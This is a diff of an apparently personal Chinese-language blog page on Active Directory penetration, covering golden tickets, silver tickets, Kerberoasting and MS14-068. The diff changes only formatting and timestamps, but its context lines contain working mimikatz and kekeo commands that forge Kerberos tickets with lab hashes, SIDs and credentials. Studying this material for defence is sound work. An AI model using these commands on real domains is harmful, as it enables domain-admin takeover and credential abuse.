@@ -248,7 +248,7 @@
 
     
         <meta property="article:published_time" content="Fri Jan 19 2018 08:10:00 GMT-0500">
-        <meta property="article:modified_time" content="Tue Mar 27 2018 02:20:46 GMT-0400">
+        <meta property="article:modified_time" content="Tue Mar 27 2018 07:10:19 GMT-0400">
     
 
     <!-- The Twitter Card protocol -->
@@ -271,7 +271,7 @@
     "mainEntityOfPage": "https://sp4rr0w.github.io/2018/01/19/域渗透相关/index.html",
     "headline": "域渗透相关",
     "datePublished": "Fri Jan 19 2018 08:10:00 GMT-0500",
-    "dateModified": "Tue Mar 27 2018 02:20:46 GMT-0400",
+    "dateModified": "Tue Mar 27 2018 07:10:19 GMT-0400",
     "author": {
         "@type": "Person",
         "name": "Sparrow",
@@ -577,10 +577,22 @@ mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:
 </code></pre><p>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p>
 <blockquote>
 <ul>
-<li>a. 首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。<br>  内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</li>
-<li>b. 其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。<br>  例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。<br>  此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。<br>  票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</li>
-<li>c. 再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。<br>  然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。<br>  如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。<br>  因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</li>
-<li>d. 最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。<br>  这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。<br>  也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</li>
+<li><ol>
+<li>首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。<br>内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</li>
+</ol>
+</li>
+<li><ol>
+<li>其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。<br>例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。<br>此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。<br>票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</li>
+</ol>
+</li>
+<li><ol>
+<li>再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。<br>然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。<br>如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。<br>因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</li>
+</ol>
+</li>
+<li><ol>
+<li>最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。<br>这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。<br>也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</li>
+</ol>
+</li>
 <li>所需条件: <blockquote>
 <ul>
 <li>krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限</li>
@@ -590,10 +602,6 @@ mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:
 </ul>
 </blockquote>
 </li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
 <li>简单过程:</li>
 <li>清空缓存证书<br>  kerberos::purge  ( or klist purge)</li>
 <li>手动创建了一张域管理的黄金票据<br>  kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin</li>
@@ -624,7 +632,8 @@ Scheduled Tasks            HOST
 Windows File Share        CIFS
 LDAP                    LDAP
 Windows Remote Server    RPCSS、LDAP、CIFS
-</code></pre><pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt
+</code></pre><p>用法</p>
+<pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt
 (/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash
 ![Silver_Ticket1](域渗透相关/Silver_Ticket1.png)
 </code></pre><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p>
@@ -804,7 +813,7 @@ $ sudo ldconfig
 <p>或者使用 kekeo<br>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)</p>
 <pre><code>kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)
 http://www.mottoin.com/95877.html
-</code></pre><p>參考:</p>
+</code></pre><p><strong>参考</strong></p>
 <pre><code>Attack Methods for Gaining Domain Admin Rights in Active Directory
     http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)
 一种深度隐蔽的后门方式(二)
